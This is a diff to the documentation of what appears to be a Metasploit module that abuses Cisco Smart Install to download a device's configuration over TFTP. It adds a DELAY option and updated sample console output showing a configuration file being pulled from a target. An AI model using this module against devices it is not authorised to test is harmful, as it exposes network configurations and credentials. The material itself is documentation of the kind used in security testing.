@@ -18,6 +18,9 @@ Time to wait for connection back from target. Default is `60` seconds if using `
 ### LHOST
 Address to bind to for TFTP server to accept connections if using `DOWNLOAD` if using `DOWNLOAD` action
 
+### DELAY
+Tiume to wait before requesting configuration from target. Default is `60` seconds if using `DOWNLOAD` action
+
 ## Actions
 There are two actions, default being ```SCAN```
 
@@ -49,11 +52,14 @@ Using the `DOWNLOAD` action
   ```
 msf auxiliary(cisco_smart_install) > run
 [*] a.b.c.d:4786   - Starting TFTP Server...
+[+] a.b.c.d:4786   - Fingerprinted the Cisco Smart Install protocol
+[*] a.b.c.d:4786   - Waiting 60 seconds before requesting config
 [*] a.b.c.d:4786   - Requesting configuration from device...
 [*] a.b.c.d:4786   - Waiting 60 seconds for configuration
-[*] a.b.c.d:4786   - Incoming file from a.b.c.d - jaPJDPpi.conf 14733 bytes
+[*] a.b.c.d:4786   - Incoming file from a.b.c.d - GZjWgnqv 3015 bytes
 [*] a.b.c.d:4786   - Providing some time for transfers to complete...
 [*] a.b.c.d:4786   - Shutting down the TFTP service...
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
+
 ```
